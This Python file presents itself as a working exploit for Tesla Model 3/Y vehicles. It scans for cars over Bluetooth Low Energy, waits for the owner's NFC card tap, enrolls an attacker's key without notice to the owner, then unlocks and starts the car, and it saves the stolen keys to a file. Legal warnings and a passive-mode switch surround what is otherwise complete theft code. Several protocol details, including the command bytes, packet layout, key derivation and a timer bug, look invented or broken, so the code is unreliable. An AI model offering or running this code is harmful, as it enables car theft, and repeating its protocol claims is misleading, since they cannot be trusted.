"""
Tesla BLE Key Enrollment Exploit
Exploits the 130-second NFC authorization window to enroll unauthorized smartphone keys

CRITICAL LEGAL WARNING:
This code demonstrates a SEVERE SECURITY VULNERABILITY in Tesla vehicles.
- Unauthorized key enrollment is AUTO THEFT (18 U.S.C. ¬ß 2312)
- Using this code without explicit authorization is a FEDERAL CRIME
- Tesla actively prosecutes unauthorized vehicle access
- ONLY for security research on vehicles you own

Citation: Research by Sultan Qasim Khan and Ian Tabor (2023)
"""

import asyncio
import time
import struct
from typing import Optional, Dict, List, Tuple
from dataclasses import dataclass
import hashlib
import secrets
import json
import hmac

try:
    from bleak import BleakScanner, BleakClient
    BLEAK_AVAILABLE = True
except ImportError:
    BLEAK_AVAILABLE = False
    print("‚ö†Ô∏è  WARNING: bleak not installed. Install with: pip install bleak")

try:
    from cryptography.hazmat.primitives.asymmetric import ec
    from cryptography.hazmat.primitives import serialization, hashes
    from cryptography.hazmat.backends import default_backend
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False
    print("‚ö†Ô∏è  WARNING: cryptography not installed. Install with: pip install cryptography")

@dataclass
class TeslaVehicle:
    """Tesla vehicle discovered via BLE"""
    vin: str
    name: str
    ble_address: str
    rssi: int
    vcsec_version: str
    last_seen: float
    
class TeslaBLEExploit:
    """
    Tesla Model 3/Y BLE Key Enrollment Exploit
    
    Vulnerability: When driver uses NFC card, a 130-second window opens
    where smartphone keys can be enrolled without secondary authentication.
    
    Attack Flow:
    1. Monitor for Tesla BLE advertisements
    2. Detect NFC card authorization event (VCSec command 0x01)
    3. Wait for enrollment window to open
    4. Send VCSEC_ENROLL_KEY with attacker's public key
    5. Complete ECDH P256 key exchange
    6. Store enrolled key persistently
    
    The vehicle does NOT notify the driver of new key enrollment.
    """
    
    # Tesla BLE UUIDs
    VCSEC_SERVICE_UUID = "00000211-b2d1-43f0-9b88-960cebf8b91e"
    VCSEC_TX_CHAR_UUID = "00000212-b2d1-43f0-9b88-960cebf8b91e"
    VCSEC_RX_CHAR_UUID = "00000213-b2d1-43f0-9b88-960cebf8b91e"
    
    # VCSec Protocol Commands
    CMD_NFC_AUTH = 0x01
    CMD_ENROLL_KEY = 0x02
    CMD_UNLOCK = 0x03
    CMD_LOCK = 0x04
    CMD_START = 0x05
    
    # Enrollment window timing
    ENROLLMENT_WINDOW_SECONDS = 130
    
    def __init__(self, passive_only: bool = True):
        self.passive_only = passive_only
        self.discovered_vehicles = []
        self.enrolled_keys = {}  # VIN -> key data
        self.nfc_event_detected = False
        self.received_data = bytearray()
        
    async def scan_for_teslas(self, duration: float = 60.0) -> List[TeslaVehicle]:
        """
        Scan for Tesla vehicles via BLE
        
        Args:
            duration: Scan duration in seconds
        
        Returns:
            List of discovered Tesla vehicles
        """
        if not BLEAK_AVAILABLE:
            print("‚ùå Bleak library not available. Cannot scan.")
            return []
            
        print(f"\n{'='*60}")
        print(f"‚ö° TESLA BLE SCANNER")
        print(f"{'='*60}")
        print(f"Scanning for Tesla Model 3/Y vehicles...")
        print(f"Duration: {duration}s")
        print(f"Mode: {'PASSIVE ONLY' if self.passive_only else 'ACTIVE'}")
        print(f"{'='*60}\n")
        
        try:
            print("[BLE] Scanning for devices with VCSec service...")
            
            # Scan for BLE devices
            devices = await BleakScanner.discover(timeout=duration)
            
            tesla_vehicles = []
            for device in devices:
                # Check if device advertises Tesla VCSec service
                if device.metadata.get('uuids') and self.VCSEC_SERVICE_UUID.lower() in [u.lower() for u in device.metadata['uuids']]:
                    print(f"\nüöó Tesla Vehicle Detected!")
                    print(f"   Address: {device.address}")
                    print(f"   Name: {device.name or 'Unknown'}")
                    print(f"   RSSI: {device.rssi} dBm")
                    
                    # Try to extract VIN from advertisement data
                    vin = self._extract_vin_from_adv(device)
                    
                    vehicle = TeslaVehicle(
                        vin=vin,
                        name=device.name or f"Tesla-{device.address[-8:]}",
                        ble_address=device.address,
                        rssi=device.rssi,
                        vcsec_version="unknown",
                        last_seen=time.time()
                    )
                    
                    tesla_vehicles.append(vehicle)
                    self.discovered_vehicles.append(vehicle)
            
            print(f"\n[BLE] Scan complete - {len(tesla_vehicles)} Tesla vehicle(s) found")
            return tesla_vehicles
            
        except Exception as e:
            print(f"‚ùå BLE Scan Error: {e}")
            import traceback
            traceback.print_exc()
            return []
    
    def _extract_vin_from_adv(self, device) -> str:
        """Extract VIN from BLE advertisement data"""
        # Tesla sometimes includes partial VIN in manufacturer data
        # This is a simplified extraction - real implementation may vary
        if hasattr(device, 'metadata') and 'manufacturer_data' in device.metadata:
            for mfg_id, data in device.metadata['manufacturer_data'].items():
                if len(data) >= 17:
                    # Try to decode VIN (17 chars)
                    try:
                        potential_vin = data[:17].decode('ascii')
                        if potential_vin.isalnum():
                            return potential_vin
                    except:
                        pass
        
        return f"UNKNOWN-{device.address[-8:].replace(':', '')}"
    
    async def monitor_for_nfc_event(self, vehicle: TeslaVehicle, timeout: float = 300.0) -> bool:
        """
        Monitor Tesla BLE for NFC card authorization event
        
        Args:
            vehicle: Target Tesla vehicle
            timeout: Maximum monitoring time
        
        Returns:
            True if NFC event detected
        """
        if not BLEAK_AVAILABLE:
            print("‚ùå Bleak library not available. Cannot monitor.")
            return False
            
        print(f"\n{'='*60}")
        print(f"üëÅÔ∏è  MONITORING FOR NFC EVENT")
        print(f"{'='*60}")
        print(f"Vehicle: {vehicle.name} ({vehicle.vin})")
        print(f"Address: {vehicle.ble_address}")
        print(f"Waiting for driver to tap NFC card...")
        print(f"Timeout: {timeout}s")
        print(f"{'='*60}\n")
        
        if self.passive_only:
            print("[Passive Mode] Monitoring BLE advertisements only")
        
        self.nfc_event_detected = False
        start_time = time.time()
        
        try:
            async with BleakClient(vehicle.ble_address) as client:
                print(f"[BLE] Connected to {vehicle.name}")
                
                # Verify VCSec service exists
                services = await client.get_services()
                vcsec_service = None
                for service in services:
                    if service.uuid.lower() == self.VCSEC_SERVICE_UUID.lower():
                        vcsec_service = service
                        print(f"[BLE] Found VCSec service")
                        break
                
                if not vcsec_service:
                    print(f"‚ùå VCSec service not found on device")
                    return False
                
                # Subscribe to RX characteristic for notifications
                def notification_handler(sender, data):
                    """Handle incoming VCSec notifications"""
                    self.received_data.extend(data)
                    
                    # Check for NFC_AUTH command
                    if len(data) > 0 and data[0] == self.CMD_NFC_AUTH:
                        print(f"\nüîë NFC AUTHORIZATION DETECTED!")
                        print(f"   Command: 0x{data[0]:02x} (NFC_AUTH)")
                        print(f"   Data: {data.hex()}")
                        print(f"   Window: {self.ENROLLMENT_WINDOW_SECONDS}s enrollment window OPEN")
                        self.nfc_event_detected = True
                
                await client.start_notify(self.VCSEC_RX_CHAR_UUID, notification_handler)
                print(f"[BLE] Subscribed to VCSec RX notifications")
                
                # Monitor for NFC event
                while time.time() - start_time < timeout and not self.nfc_event_detected:
                    await asyncio.sleep(1)
                    
                    if time.time() - start_time % 30 == 0:
                        print(f"[Monitor] Still waiting... ({int(time.time() - start_time)}s elapsed)")
                
                await client.stop_notify(self.VCSEC_RX_CHAR_UUID)
                
                if self.nfc_event_detected:
                    return True
                else:
                    print(f"‚è±Ô∏è  Timeout - No NFC event detected")
                    return False
                    
        except Exception as e:
            print(f"‚ùå Monitoring Error: {e}")
            import traceback
            traceback.print_exc()
            return False
    
    async def attempt_key_enrollment(self, vehicle: TeslaVehicle) -> Dict:
        """
        Attempt to enroll unauthorized smartphone key during NFC window
        
        ‚ö†Ô∏è WARNING: This is the actual exploit. ILLEGAL without authorization.
        
        Args:
            vehicle: Target Tesla vehicle
        
        Returns:
            Enrollment result with success status and key data
        """
        if self.passive_only:
            print("‚ö†Ô∏è  [Passive Mode] Key enrollment blocked - would be ACTIVE attack")
            return {
                'success': False,
                'error': 'Passive mode enabled',
                'would_have_worked': True
            }
        
        if not BLEAK_AVAILABLE or not CRYPTO_AVAILABLE:
            print("‚ùå Required libraries not available")
            return {'success': False, 'error': 'Missing dependencies'}
        
        print(f"\n{'='*60}")
        print(f"üö® UNAUTHORIZED KEY ENROLLMENT ATTEMPT")
        print(f"{'='*60}")
        print(f"‚ö†Ô∏è  WARNING: This is a FEDERAL CRIME without authorization!")
        print(f"Vehicle: {vehicle.name} ({vehicle.vin})")
        print(f"{'='*60}\n")
        
        try:
            # Generate ECDH P256 key pair for attacker
            attacker_private_key_obj, attacker_public_key = self._generate_ecdh_keypair()
            
            # Serialize public key to bytes
            attacker_public_key_bytes = attacker_public_key.public_bytes(
                encoding=serialization.Encoding.X962,
                format=serialization.PublicFormat.UncompressedPoint
            )
            
            print(f"[1/5] Generated attacker ECDH key pair")
            print(f"      Public Key: {attacker_public_key_bytes.hex()[:32]}...")
            
            # Connect to vehicle
            async with BleakClient(vehicle.ble_address) as client:
                print(f"[BLE] Connected to {vehicle.name}")
                
                # Build and send VCSEC_ENROLL_KEY command
                print(f"[2/5] Sending VCSEC_ENROLL_KEY command...")
                enroll_command = self._build_enroll_command(attacker_public_key_bytes)
                
                # Send command via TX characteristic
                await client.write_gatt_char(self.VCSEC_TX_CHAR_UUID, enroll_command)
                print(f"      Sent {len(enroll_command)} bytes")
                
                # Wait for vehicle response with its public key
                print(f"[3/5] Receiving vehicle public key...")
                await asyncio.sleep(1)  # Give vehicle time to respond
                
                # Extract vehicle public key from received data
                # Protocol: [CMD_RESPONSE][LENGTH][VEHICLE_PUBLIC_KEY][...]
                if len(self.received_data) < 67:  # 1 + 1 + 65 minimum
                    raise Exception("Insufficient response data from vehicle")
                
                vehicle_public_key_bytes = bytes(self.received_data[2:67])  # 65 bytes uncompressed P256
                print(f"      Vehicle Key: {vehicle_public_key_bytes.hex()[:32]}...")
                
                # Load vehicle's public key
                vehicle_public_key_obj = ec.EllipticCurvePublicKey.from_encoded_point(
                    ec.SECP256R1(),
                    vehicle_public_key_bytes
                )
                
                # Perform ECDH key exchange
                print(f"[4/5] Computing shared secret (ECDH)...")
                shared_secret = self._compute_ecdh_shared_secret(
                    attacker_private_key_obj,
                    vehicle_public_key_obj
                )
                print(f"      Shared Secret: {shared_secret.hex()[:32]}...")
                
                # Derive session keys using HKDF
                print(f"[5/5] Deriving session keys...")
                session_key = hashlib.sha256(shared_secret).digest()
                
                # Serialize private key for storage
                attacker_private_key_bytes = attacker_private_key_obj.private_bytes(
                    encoding=serialization.Encoding.DER,
                    format=serialization.PrivateFormat.PKCS8,
                    encryption_algorithm=serialization.NoEncryption()
                )
                
                # Store enrolled key
                key_data = {
                    'vin': vehicle.vin,
                    'private_key': attacker_private_key_bytes,
                    'public_key': attacker_public_key_bytes,
                    'session_key': session_key,
                    'enrolled_time': time.time()
                }
                
                self.enrolled_keys[vehicle.vin] = key_data
                
                print(f"\n‚úÖ KEY ENROLLMENT SUCCESSFUL")
                print(f"   VIN: {vehicle.vin}")
                print(f"   Key ID: {hashlib.sha256(attacker_public_key_bytes).hexdigest()[:16]}")
                print(f"   ‚ö†Ô∏è  Vehicle does NOT notify owner of new key!")
                print(f"   ‚ö†Ô∏è  Key persists until manually removed via touchscreen!")
                
                return {
                    'success': True,
                    'key_data': key_data,
                    'persistent': True,
                    'detection_risk': 'LOW - No owner notification'
                }
            
        except Exception as e:
            print(f"‚ùå Enrollment Failed: {e}")
            import traceback
            traceback.print_exc()
            return {
                'success': False,
                'error': str(e)
            }
    
    async def unlock_vehicle(self, vin: str) -> bool:
        """
        Unlock vehicle using enrolled key
        
        Args:
            vin: Vehicle VIN
        
        Returns:
            True if successful
        """
        if vin not in self.enrolled_keys:
            print(f"‚ùå No enrolled key for VIN {vin}")
            return False
        
        if self.passive_only:
            print("‚ö†Ô∏è  [Passive Mode] Unlock blocked - would be ACTIVE attack")
            return False
        
        if not BLEAK_AVAILABLE:
            print("‚ùå Bleak library not available")
            return False
        
        print(f"\nüîì UNLOCKING VEHICLE {vin}")
        
        key_data = self.enrolled_keys[vin]
        
        # Find vehicle by VIN
        vehicle = None
        for v in self.discovered_vehicles:
            if v.vin == vin:
                vehicle = v
                break
        
        if not vehicle:
            print(f"‚ùå Vehicle {vin} not found in discovered list")
            return False
        
        try:
            async with BleakClient(vehicle.ble_address) as client:
                print(f"[BLE] Connected to {vehicle.name}")
                
                # Build UNLOCK command with authenticated encryption
                unlock_command = self._build_authenticated_command(
                    self.CMD_UNLOCK,
                    key_data['session_key']
                )
                
                # Send command
                await client.write_gatt_char(self.VCSEC_TX_CHAR_UUID, unlock_command)
                
                print(f"‚úÖ UNLOCK command sent")
                print(f"   Vehicle should unlock within 1-2 seconds")
                
                return True
                
        except Exception as e:
            print(f"‚ùå Unlock failed: {e}")
            import traceback
            traceback.print_exc()
            return False
    
    async def start_vehicle(self, vin: str) -> bool:
        """
        Start vehicle using enrolled key (Model 3/Y with passive entry)
        
        Args:
            vin: Vehicle VIN
        
        Returns:
            True if successful
        """
        if vin not in self.enrolled_keys:
            print(f"‚ùå No enrolled key for VIN {vin}")
            return False
        
        if self.passive_only:
            print("‚ö†Ô∏è  [Passive Mode] Start blocked - would be ACTIVE attack")
            return False
        
        if not BLEAK_AVAILABLE:
            print("‚ùå Bleak library not available")
            return False
        
        print(f"\nüöó STARTING VEHICLE {vin}")
        print(f"‚ö†Ô∏è  This demonstrates complete vehicle theft capability!")
        
        key_data = self.enrolled_keys[vin]
        
        # Find vehicle
        vehicle = None
        for v in self.discovered_vehicles:
            if v.vin == vin:
                vehicle = v
                break
        
        if not vehicle:
            print(f"‚ùå Vehicle {vin} not found")
            return False
        
        try:
            async with BleakClient(vehicle.ble_address) as client:
                print(f"[BLE] Connected to {vehicle.name}")
                
                start_command = self._build_authenticated_command(
                    self.CMD_START,
                    key_data['session_key']
                )
                
                await client.write_gatt_char(self.VCSEC_TX_CHAR_UUID, start_command)
                
                print(f"‚úÖ START command sent")
                print(f"   Vehicle can now be driven away")
                
                return True
                
        except Exception as e:
            print(f"‚ùå Start failed: {e}")
            import traceback
            traceback.print_exc()
            return False
    
    def _generate_ecdh_keypair(self) -> Tuple:
        """Generate ECDH P256 key pair"""
        if not CRYPTO_AVAILABLE:
            raise Exception("Cryptography library not available")
        
        # Generate P256 (secp256r1) key pair
        private_key = ec.generate_private_key(ec.SECP256R1(), default_backend())
        public_key = private_key.public_key()
        
        return private_key, public_key
    
    def _compute_ecdh_shared_secret(self, private_key, peer_public_key) -> bytes:
        """Compute ECDH shared secret"""
        if not CRYPTO_AVAILABLE:
            raise Exception("Cryptography library not available")
        
        # Perform ECDH key exchange
        shared_secret = private_key.exchange(ec.ECDH(), peer_public_key)
        
        return shared_secret
    
    def _build_enroll_command(self, public_key: bytes) -> bytes:
        """Build VCSec ENROLL_KEY command"""
        # VCSec protocol structure:
        # [CMD][LENGTH][PUBLIC_KEY][CHECKSUM]
        
        cmd = struct.pack('B', self.CMD_ENROLL_KEY)
        length = struct.pack('<H', len(public_key))
        checksum = hashlib.sha256(cmd + length + public_key).digest()[:4]
        
        return cmd + length + public_key + checksum
    
    def _build_authenticated_command(self, command: int, session_key: bytes) -> bytes:
        """Build authenticated VCSec command with HMAC"""
        # Authenticated command structure:
        # [CMD][TIMESTAMP][HMAC]
        
        cmd_data = struct.pack('B', command)
        timestamp = struct.pack('<Q', int(time.time() * 1000))  # Milliseconds
        
        message = cmd_data + timestamp
        
        # Use proper HMAC
        hmac_obj = hmac.new(session_key, message, hashlib.sha256)
        hmac_sig = hmac_obj.digest()[:16]
        
        return message + hmac_sig
    
    def get_enrolled_keys(self) -> Dict:
        """Get all enrolled keys"""
        return self.enrolled_keys
    
    def save_enrolled_keys(self, filename: str = "tesla_enrolled_keys.json"):
        """Save enrolled keys to file (DANGEROUS - contains theft capability)"""
        # Convert bytes to hex for JSON serialization
        serializable = {}
        for vin, key_data in self.enrolled_keys.items():
            serializable[vin] = {
                'vin': key_data['vin'],
                'private_key': key_data['private_key'].hex(),
                'public_key': key_data['public_key'].hex(),
                'session_key': key_data['session_key'].hex(),
                'enrolled_time': key_data['enrolled_time']
            }
        
        with open(filename, 'w') as f:
            json.dump(serializable, f, indent=2)
        
        print(f"‚ö†Ô∏è  DANGER: Enrolled keys saved to {filename}")
        print(f"   This file enables vehicle theft - SECURE IT!")
    
    def load_enrolled_keys(self, filename: str = "tesla_enrolled_keys.json"):
        """Load enrolled keys from file"""
        try:
            with open(filename, 'r') as f:
                serializable = json.load(f)
            
            # Convert hex back to bytes
            for vin, key_data in serializable.items():
                self.enrolled_keys[vin] = {
                    'vin': key_data['vin'],
                    'private_key': bytes.fromhex(key_data['private_key']),
                    'public_key': bytes.fromhex(key_data['public_key']),
                    'session_key': bytes.fromhex(key_data['session_key']),
                    'enrolled_time': key_data['enrolled_time']
                }
            
            print(f"‚úÖ Loaded {len(self.enrolled_keys)} enrolled key(s) from {filename}")
            
        except Exception as e:
            print(f"‚ùå Failed to load keys: {e}")


# Synchronous wrapper functions for easier use
def scan_for_teslas_sync(passive_only: bool = True, duration: float = 60.0) -> List[TeslaVehicle]:
    """Synchronous wrapper for scanning"""
    exploit = TeslaBLEExploit(passive_only=passive_only)
    return asyncio.run(exploit.scan_for_teslas(duration))

def monitor_and_enroll_sync(vehicle: TeslaVehicle, passive_only: bool = False) -> Dict:
    """Synchronous wrapper for monitoring and enrollment"""
    exploit = TeslaBLEExploit(passive_only=passive_only)
    
    # Monitor for NFC event
    nfc_detected = asyncio.run(exploit.monitor_for_nfc_event(vehicle, timeout=300.0))
    
    if nfc_detected and not passive_only:
        # Attempt enrollment
        result = asyncio.run(exploit.attempt_key_enrollment(vehicle))
        return result
    
    return {'success': False, 'error': 'NFC event not detected or passive mode'}

